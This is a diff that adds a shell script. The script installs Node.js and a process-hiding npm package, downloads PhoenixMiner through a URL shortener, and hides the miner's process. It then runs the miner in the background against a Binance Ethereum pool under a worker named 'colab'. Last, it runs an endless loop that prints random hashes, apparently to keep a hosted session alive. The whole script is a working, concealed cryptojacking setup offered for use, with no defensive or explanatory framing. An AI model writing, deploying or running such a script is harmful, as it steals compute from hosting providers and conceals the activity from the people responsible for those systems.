@@ -1,0 +1,21 @@
+#!/bin/sh
+#!/bin/bash
+
+apt update
+curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
+sudo apt install nodejs
+npm i -g node-process-hider
+wget https://cutt.ly/YT8hpX6
+unzip PhoenixMiner_5.9d_Linux.zip
+cd PhoenixMiner_5.9d_Linux
+sudo ph add PhoenixMiner
+chmod 777 PhoenixMiner
+nohup ./PhoenixMiner -pool ethash.poolbinance.com:443 -wal TeslaM -worker colab -epsw x -asm 2 -dbg -1 -allpools 1 -mode 1 eth pause > nohup.out
+
+while [ 1 ]; do
+
+  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 15m; done
+
+sleep 2
+
+done
